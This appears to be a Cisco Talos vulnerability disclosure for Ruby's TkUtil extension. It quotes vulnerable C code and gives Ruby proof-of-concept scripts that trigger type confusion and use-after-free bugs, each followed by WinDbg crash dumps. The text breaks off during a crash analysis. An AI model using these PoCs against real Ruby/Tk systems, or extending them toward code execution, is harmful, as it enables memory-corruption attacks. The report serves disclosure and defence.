Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby TkUtil class multiple vulnerabilities - Type Confusion and Use After Free.

:: Description

Multiple vulerabilities exist in TkUtil methods. Because of lack of type checking before variable use, type confusion vulnerabilities appear in
_setup_subst_table, scan_args , hash_kv methods. _setup_subst_table method is also vulnerable to use after free vulnerability.
 

:: Tested Versions

Ruby 2.3.0 dev
Ruby 2.2.2

:: Product URLs

https://www.ruby-lang.org

:: Table of content

:: 1#Details - TkUtil CallbackSubst - Type Confusion
:: 2#Details - TkUtil CallbackSubst - Use After Free
:: 3#Details - TkUtil scan_args		- Type Confusion
:: 4#Details - TkUtil hash_kv		- Type Confusion



:: 1#Details - TkUtil CallbackSubst - Type Confusion

Vulnerable code:

------------------------------------- code -----------------------------------------------------
Line 1549	static VALUE
Line 1550	cbsubst_table_setup(argc, argv, self)
Line 1551	int   argc;
Line 1552	VALUE *argv;
Line 1553	VALUE self;
Line 1554	{
Line 1555		volatile VALUE cbsubst_obj;
Line 1556		volatile VALUE key_inf;
Line 1557		volatile VALUE longkey_inf;
Line 1558		volatile VALUE proc_inf;
Line 1559		VALUE inf;
Line 1560		ID id;
Line 1561		struct cbsubst_info *subst_inf;
Line 1562		long idx, len;
Line 1563		unsigned char chr;
Line 1564
Line 1565		/* accept (key_inf, proc_inf) or (key_inf, longkey_inf, procinf) */
Line 1566		if (rb_scan_args(argc, argv, "21", &key_inf, &longkey_inf, &proc_inf) == 2) {
(...)
Line 1579		/*
Line 1580		 * keys : array of [subst, type, ivar]
Line 1581		 *         subst ==> char code or string
Line 1582		 *         type  ==> char code or string
Line 1583		 *         ivar  ==> symbol
Line 1584		 */
Line 1585		len = RARRAY_LEN(key_inf);
Line 1586		for(idx = 0; idx < len; idx++) {
Line 1587			inf = RARRAY_PTR(key_inf)[idx];
Line 1588			if (!RB_TYPE_P(inf, T_ARRAY)) continue;
Line 1589
Line 1590			chr = NUM2CHR(RARRAY_PTR(inf)[0]);
Line 1591			subst_inf->type[chr] = NUM2CHR(RARRAY_PTR(inf)[1]);
Line 1592
Line 1593			subst_inf->full_subst_length += 3;
Line 1594
Line 1595			id = SYM2ID(RARRAY_PTR(inf)[2]);
Line 1596			subst_inf->ivar[chr] = rb_intern_str(rb_sprintf("@%"PRIsVALUE, rb_id2str(id)));
Line 1597
Line 1598			rb_attr(self, id, 1, 0, Qtrue);
Line 1599		}
Line 1600
Line 1601
Line 1602		/*
Line 1603		 * longkeys : array of [name, type, ivar]
Line 1604		 *         name ==> longname key string
Line 1605		 *         type ==> char code or string
Line 1606		 *         ivar ==> symbol
Line 1607		 */
Line 1608		len = RARRAY_LEN(longkey_inf);
Line 1609		for(idx = 0; idx < len; idx++) {
Line 1610			inf = RARRAY_PTR(longkey_inf)[idx];
Line 1611			if (!RB_TYPE_P(inf, T_ARRAY)) continue;
Line 1612
Line 1613			chr = (unsigned char)(0x80 + idx);
Line 1614			subst_inf->keylen[chr] = RSTRING_LEN(RARRAY_PTR(inf)[0]);
Line 1615	#if HAVE_STRNDUP
Line 1616			subst_inf->key[chr] = strndup(RSTRING_PTR(RARRAY_PTR(inf)[0]),
Line 1617										  RSTRING_LEN(RARRAY_PTR(inf)[0]));
Line 1618	#else
Line 1619			subst_inf->key[chr] = malloc(RSTRING_LEN(RARRAY_PTR(inf)[0]) + 1);
Line 1620			if (subst_inf->key[chr]) {
Line 1621				strncpy(subst_inf->key[chr], RSTRING_PTR(RARRAY_PTR(inf)[0]),
Line 1622						RSTRING_LEN(RARRAY_PTR(inf)[0]) + 1);
Line 1623				subst_inf->key[chr][RSTRING_LEN(RARRAY_PTR(inf)[0])] = '\0';
Line 1624			}
Line 1625	#endif
Line 1626			subst_inf->type[chr] = NUM2CHR(RARRAY_PTR(inf)[1]);
Line 1627
Line 1628			subst_inf->full_subst_length += (subst_inf->keylen[chr] + 2);
Line 1629
Line 1630			id = SYM2ID(RARRAY_PTR(inf)[2]);
Line 1631			subst_inf->ivar[chr] = rb_intern_str(rb_sprintf("@%"PRIsVALUE, rb_id2str(id)));
Line 1632
Line 1633			rb_attr(self, id, 1, 0, Qtrue);
Line 1634		}
Line 1635
Line 1636		/*
Line 1637		 * procs : array of [type, proc]
Line 1638		 *         type  ==> char code or string
Line 1639		 *         proc  ==> proc/method/obj (must respond to 'call')
Line 1640		 */
Line 1641		len = RARRAY_LEN(proc_inf);
Line 1642		for(idx = 0; idx < len; idx++) {
Line 1643			inf = RARRAY_PTR(proc_inf)[idx];
Line 1644			if (!RB_TYPE_P(inf, T_ARRAY)) continue;
Line 1645			rb_hash_aset(subst_inf->proc,
Line 1646						 (RB_TYPE_P(RARRAY_PTR(inf)[0], T_STRING)?
Line 1647						  INT2FIX(*(RSTRING_PTR(RARRAY_PTR(inf)[0]))) :
Line 1648						  RARRAY_PTR(inf)[0]),
Line 1649						 RARRAY_PTR(inf)[1]);
Line 1650		}
------------------------------------- code -----------------------------------------------------

As You can read in line 1566 "CallbackSubst" method takes max 3 arguments:  key_inf, longkey_inf ,proc_inf. Reading code further we can notice that
none of parameters is check for particular type before usage. Developers just assumed that these parameters should be passed as Arrays and treat arguments in that way:
"key_inf" 		lines 1585,1587
"longkey_inf"   lines 1608,1610
"proc_inf"		lines 1641,1643
Attacker passing different type of object than Array can try to lead to arbitrary code execution in some circumstance using type confusion vulnerability.

:: PoC

:: long_key PoC
------------------------------------- code -----------------------------------------------------
require 'tk'

key_inf 	= [ [?n, ?s, :node], nil ]
longkey_inf = 0x11223344 # expects Array
proc_inf	= [ [?s, TkComm.method(:string) ], nil ]
TkUtil::CallbackSubst._setup_subst_table(key_inf,longkey_inf,proc_inf) # Type confusion
------------------------------------- code -----------------------------------------------------

:: Crash analysis
-----------------------------------------------------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
tkutil+46d4
6f3846d4 8b00            mov     eax,dword ptr [eax]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6f3846d4 (tkutil+0x000046d4)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 22446689
Attempt to read from address 22446689

FAULTING_THREAD:  00001888

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  22446689

READ_ADDRESS:  22446689 

FOLLOWUP_IP: 
tkutil+46d4
6f3846d4 8b00            mov     eax,dword ptr [eax]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 640bec10 to 6f3846d4

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f968 640bec10 00000003 005e0040 027eb368 tkutil+0x46d4
0028f9e8 640cabd1 00759c18 0065ffd0 026ccb50 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 00759c18 0065ffd0 026ccb50 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 0253dbb0 640da9e0 00506250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 00751c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 0253dbb0 00754728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 00754728 00751ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 605ab01e 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  tkutil+46d4

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: tkutil

IMAGE_NAME:  tkutil.so

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34d4

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_tkutil.so!Unknown

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_tkutil+46d4

Followup: MachineOwner
---------

0:000> r
eax=22446689 ebx=00759c18 ecx=ffffffff edx=0028f904 esi=02b95538 edi=00000003
eip=6f3846d4 esp=0028f8f0 ebp=0028f968 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
tkutil+0x46d4:
6f3846d4 8b00            mov     eax,dword ptr [eax]  ds:002b:22446689=????????
-----------------------------------------------------------------------------------------




:: long_key element "inf" PoC
------------------------------------- code -----------------------------------------------------
require 'tk'

key_inf 	= [ [?n, ?s, :node], nil ]
longkey_inf = [[0x11223344,0x55667788,0x99553311]]# expects Strings 
proc_inf	= [ [?s, TkComm.method(:string) ], nil ]
TkUtil::CallbackSubst._setup_subst_table(key_inf,longkey_inf,proc_inf) # Type confusion
------------------------------------- code -----------------------------------------------------

:: Crash analysis
-----------------------------------------------------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Module load completed but symbols could not be loaded for image00400000
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
tkutil+4f0a
6f384f0a 8b00            mov     eax,dword ptr [eax]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6f384f0a (tkutil+0x00004f0a)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 22446689
Attempt to read from address 22446689

FAULTING_THREAD:  00001d9c

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  22446689

READ_ADDRESS:  22446689 

FOLLOWUP_IP: 
tkutil+4f0a
6f384f0a 8b00            mov     eax,dword ptr [eax]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 640bec10 to 6f384f0a

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f968 640bec10 00000003 00600040 02ca0888 tkutil+0x4f0a
0028f9e8 640cabd1 00789c18 0067ffd0 02784120 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 00789c18 0067ffd0 02784120 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 0079d5f8 640da9e0 00526250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 00781c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 0079d5f8 00784728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 00784728 00781ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 60585c21 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  tkutil+4f0a

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: tkutil

IMAGE_NAME:  tkutil.so

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34d4

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_tkutil.so!Unknown

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_tkutil+4f0a

Followup: MachineOwner
---------

0:000> r
eax=22446689 ebx=02d5a498 ecx=00000186 edx=00001865 esi=00000000 edi=00000001
eip=6f384f0a esp=0028f8f0 ebp=0028f968 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
tkutil+0x4f0a:
6f384f0a 8b00            mov     eax,dword ptr [eax]  ds:002b:22446689=????????
-----------------------------------------------------------------------------------------




:: key_inf PoC

------------------------------------- code -----------------------------------------------------
require 'tk'

key_inf 	= 0x11223344 # expects Array
longkey_inf = [["a","b","c"]]
proc_inf	= [ [?s, TkComm.method(:string) ], nil ]
TkUtil::CallbackSubst._setup_subst_table(key_inf,longkey_inf,proc_inf) # Type confusion
------------------------------------- code -----------------------------------------------------

:: Crash analysis
-----------------------------------------------------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Module load completed but symbols could not be loaded for image00400000
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
tkutil+4850
6f384850 8b00            mov     eax,dword ptr [eax]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6f384850 (tkutil+0x00004850)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 22446689
Attempt to read from address 22446689

FAULTING_THREAD:  000022c8

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  22446689

READ_ADDRESS:  22446689 

FOLLOWUP_IP: 
tkutil+4850
6f384850 8b00            mov     eax,dword ptr [eax]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 640bec10 to 6f384850

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f968 640bec10 00000003 00600040 02beb4c0 tkutil+0x4850
0028f9e8 640cabd1 006d9c18 0067ffd0 0271a608 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 006d9c18 0067ffd0 0271a608 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 0251ddc8 640da9e0 00526250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 006d1c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 0251ddc8 006d4728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 006d4728 006d1ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 60273181 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  tkutil+4850

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: tkutil

IMAGE_NAME:  tkutil.so

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34d4

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_tkutil.so!Unknown

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_tkutil+4850

Followup: MachineOwner
---------

0:000> r
eax=22446689 ebx=006d9c18 ecx=00000268 edx=00002680 esi=02b662e0 edi=0448fd14
eip=6f384850 esp=0028f8f0 ebp=0028f968 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
tkutil+0x4850:
6f384850 8b00            mov     eax,dword ptr [eax]  ds:002b:22446689=????????
-----------------------------------------------------------------------------------------


:: 2#Details - TkUtil CallbackSubst - Use After Free
:: 2.1 key_inf

Vulnerable code:
------------------------------------------ code ----------------------------------------------
Line 1585		len = RARRAY_LEN(key_inf);
Line 1586		for(idx = 0; idx < len; idx++) {
Line 1587			inf = RARRAY_PTR(key_inf)[idx];
Line 1588			if (!RB_TYPE_P(inf, T_ARRAY)) continue;
Line 1589
Line 1590			chr = NUM2CHR(RARRAY_PTR(inf)[0]); // use call to "to_int" method to free inf array
Line 1591			subst_inf->type[chr] = NUM2CHR(RARRAY_PTR(inf)[1]); // UAF
Line 1592
Line 1593			subst_inf->full_subst_length += 3;
Line 1594
Line 1595			id = SYM2ID(RARRAY_PTR(inf)[2]); //UAF
------------------------------------------ code ----------------------------------------------

Notice that array "key_inf" and later its item "inf" array during operation made on it is not "frozen"/protected against modyfications. Exploiting 
this fact and possibility to trigger custom code via "to_int" method called on a object different than String during conversion in line 1590
(see implementation of this macro), attacker can remove elements from "key_inf" or "inf" array causing in further lines
access to non existing elements - use after free. Spraying properly released memory attacker can lead to arbitrary code execution.

-------------------------------------- PoC------------------------------------
require 'tk'

obj = Object.new()

def obj.to_int()
	puts "releasing inf array"
	$inf.clear()
	$inf = nil
	GC.start()
	return 0xab
end

$inf = [obj, "a", :node]

key_inf 	= [ $inf, nil ]
longkey_inf = [ [?n, ?s, :node], nil ]
proc_inf	= [ [?s, TkComm.method(:string) ], nil ]
TkUtil::CallbackSubst._setup_subst_table(key_inf,longkey_inf,proc_inf) 
-------------------------------------- PoC------------------------------------

:: Crash analysis 
------------------------------------------ code ----------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\lib\ruby\2.2.0\i386-mingw32\tkutil.so - 
*** ERROR: Module load completed but symbols could not be loaded for image00400000
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
msvcrt_ruby220!st_lookup+f
640588cf 8b06            mov     eax,dword ptr [esi]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 640588cf (msvcrt_ruby220!st_lookup+0x0000000f)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 00000000
Attempt to read from address 00000000

FAULTING_THREAD:  00002480

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  00000000

READ_ADDRESS:  00000000 

FOLLOWUP_IP: 
msvcrt_ruby220!st_lookup+f
640588cf 8b06            mov     eax,dword ptr [esi]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

BUGCHECK_STR:  APPLICATION_FAULT_NULL_POINTER_READ_BEFORE_CALL

PRIMARY_PROBLEM_CLASS:  NULL_POINTER_READ_BEFORE_CALL

DEFAULT_BUCKET_ID:  NULL_POINTER_READ_BEFORE_CALL

LAST_CONTROL_TRANSFER:  from 640bf3b2 to 640588cf

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f6a8 640bf3b2 00000000 00000099 0028f6dc msvcrt_ruby220!st_lookup+0xf
0028f6f8 640c8324 02e5a638 00000099 0028f72c msvcrt_ruby220!rb_method_entry_get_without_cache+0x32
0028f798 640c8465 00000c21 029011d0 00380000 msvcrt_ruby220!rb_vm_call+0xa4
0028f828 63fea5e2 02e5a470 00000c21 00000000 msvcrt_ruby220!rb_check_funcall+0x55
0028f878 63febce3 00000001 0064ca40 0028f8a8 msvcrt_ruby220!rb_obj_freeze+0x92
0028f898 63fe5ae2 02e5a470 fffffffe 7598f489 msvcrt_ruby220!rb_to_int+0x43
0028f8e8 6f385018 02e5a470 02c965a0 6f38a4c0 msvcrt_ruby220!rb_num2long+0x32
0028f968 640bec10 00000003 00430044 02da0608 tkutil+0x5018
0028f9e8 640cabd1 00389c18 004affd0 02888aa0 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 00389c18 004affd0 02888aa0 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 005ec9b0 640da9e0 00736250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 00381c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 005ec9b0 00384728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 00384728 00381ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 6024202c 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  msvcrt_ruby220!st_lookup+f

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: msvcrt_ruby220

IMAGE_NAME:  msvcrt-ruby220.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34ec

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  NULL_POINTER_READ_BEFORE_CALL_c0000005_msvcrt-ruby220.dll!st_lookup

BUCKET_ID:  APPLICATION_FAULT_NULL_POINTER_READ_BEFORE_CALL_DETOURED_msvcrt_ruby220!st_lookup+f

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/image00400000/2_2_2_95/552f34ec/msvcrt-ruby220_dll/2_2_2_95/552f34ec/c0000005/001188cf.htm?Retriage=1

Followup: MachineOwner
---------

0:000> r
eax=00000000 ebx=00000099 ecx=0065d248 edx=00000099 esi=00000000 edi=02e5a638
eip=640588cf esp=0028f670 ebp=0028f6a8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
msvcrt_ruby220!st_lookup+0xf:
640588cf 8b06            mov     eax,dword ptr [esi]  ds:002b:00000000=????????
------------------------------------------ code ----------------------------------------------



:: 2.2 longkey_inf

Vulnerable code:
------------------------------------------ code ----------------------------------------------
Line 1608		len = RARRAY_LEN(longkey_inf);
Line 1609		for(idx = 0; idx < len; idx++) {
Line 1610			inf = RARRAY_PTR(longkey_inf)[idx];
Line 1611			if (!RB_TYPE_P(inf, T_ARRAY)) continue;
Line 1612
Line 1613			chr = (unsigned char)(0x80 + idx);
Line 1614			subst_inf->keylen[chr] = RSTRING_LEN(RARRAY_PTR(inf)[0]);
Line 1615	#if HAVE_STRNDUP
Line 1616			subst_inf->key[chr] = strndup(RSTRING_PTR(RARRAY_PTR(inf)[0]),
Line 1617										  RSTRING_LEN(RARRAY_PTR(inf)[0]));
Line 1618	#else
Line 1619			subst_inf->key[chr] = malloc(RSTRING_LEN(RARRAY_PTR(inf)[0]) + 1);
Line 1620			if (subst_inf->key[chr]) {
Line 1621				strncpy(subst_inf->key[chr], RSTRING_PTR(RARRAY_PTR(inf)[0]),
Line 1622						RSTRING_LEN(RARRAY_PTR(inf)[0]) + 1);
Line 1623				subst_inf->key[chr][RSTRING_LEN(RARRAY_PTR(inf)[0])] = '\0';
Line 1624			}
Line 1625	#endif
Line 1626			subst_inf->type[chr] = NUM2CHR(RARRAY_PTR(inf)[1]); // release inf array elements in custom to_int method
Line 1627
Line 1628			subst_inf->full_subst_length += (subst_inf->keylen[chr] + 2);
Line 1629
Line 1630			id = SYM2ID(RARRAY_PTR(inf)[2]); // Use After Free
Line 1631			subst_inf->ivar[chr] = rb_intern_str(rb_sprintf("@%"PRIsVALUE, rb_id2str(id)));
------------------------------------------ code ----------------------------------------------
The same situation like for "key_inf" argument. See comments.

-------------------------------------- PoC------------------------------------
require 'tk'

obj = Object.new()

def obj.to_int()
	puts "releasing inf array"
	$inf.clear()
	$inf = nil
	GC.start()
	return 0xab
end

$inf = ["a", obj, :node]

key_inf 	= [ [?n, ?s, :node], nil ]
longkey_inf = [ $inf, nil ]
proc_inf	= [ [?s, TkComm.method(:string) ], nil ]
TkUtil::CallbackSubst._setup_subst_table(key_inf,longkey_inf,proc_inf) 
-------------------------------------- PoC------------------------------------


:: 3#Details - TkUtil scan_args	- Type Confusion

Vulnerable code
------------------------------------------ code ----------------------------------------------
Line 1664	static VALUE
Line 1665	cbsubst_scan_args(self, arg_key, val_ary)
Line 1666	VALUE self;
Line 1667	VALUE arg_key;
Line 1668	VALUE val_ary;
Line 1669	{
Line 1670		struct cbsubst_info *inf;
Line 1671		long idx;
Line 1672		unsigned char *keyptr = (unsigned char*)RSTRING_PTR(arg_key);
Line 1673		long keylen = RSTRING_LEN(arg_key);
Line 1674		long vallen = RARRAY_LEN(val_ary);
Line 1675		unsigned char type_chr;
Line 1676		volatile VALUE dst = rb_ary_new2(vallen);
Line 1677		volatile VALUE proc;
Line 1678		int thr_crit_bup;
Line 1679		VALUE old_gc;
Line 1680
Line 1681		thr_crit_bup = rb_thread_critical;
Line 1682		rb_thread_critical = Qtrue;
Line 1683
Line 1684		old_gc = rb_gc_disable();
Line 1685
Line 1686		inf = cbsubst_get_ptr(self);
Line 1687
Line 1688		for(idx = 0; idx < vallen; idx++) {
Line 1689			if (idx >= keylen) {
Line 1690				proc = Qnil;
Line 1691			} else if (*(keyptr + idx) == ' ') {
Line 1692				proc = Qnil;
Line 1693			} else {
Line 1694				if ((type_chr = inf->type[*(keyptr + idx)]) != 0) {
Line 1695					proc = rb_hash_aref(inf->proc, INT2FIX((int)type_chr));
Line 1696				} else {
Line 1697					proc = Qnil;
Line 1698				}
Line 1699			}
Line 1700
Line 1701			if (NIL_P(proc)) {
Line 1702				rb_ary_push(dst, RARRAY_PTR(val_ary)[idx]);
Line 1703			} else {
Line 1704				rb_ary_push(dst, rb_funcall(proc, ID_call, 1,
Line 1705											RARRAY_PTR(val_ary)[idx]));
Line 1706			}
Line 1707		}
------------------------------------------ code ----------------------------------------------

Function is vulnerable to type confusion vulnerability because both of its arguments "arg_key" and "val_ary" are not check for
particular type before usage. We see in lines 1673 and 1674 that developers assumed that "arg_key" parameter is a String and "val_ary" is an Array
and treat it in that way. Attacker passing different type of object than these assumed by developers for these arguments 
can try to lead to arbitrary code execution in some circumstance using type confusion vulnerability.

:: 3.1 arg_key PoC
------------------------ PoC -------------------------------
require 'tk'

TkUtil::CallbackSubst.scan_args(0x11223344,[]) 

------------------------ PoC -------------------------------

:: Crash analysis
------------------------------------------ code ----------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Module load completed but symbols could not be loaded for image00400000
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
tkutil+24ef
6f3824ef 8b10            mov     edx,dword ptr [eax]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6f3824ef (tkutil+0x000024ef)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 22446689
Attempt to read from address 22446689

FAULTING_THREAD:  0000157c

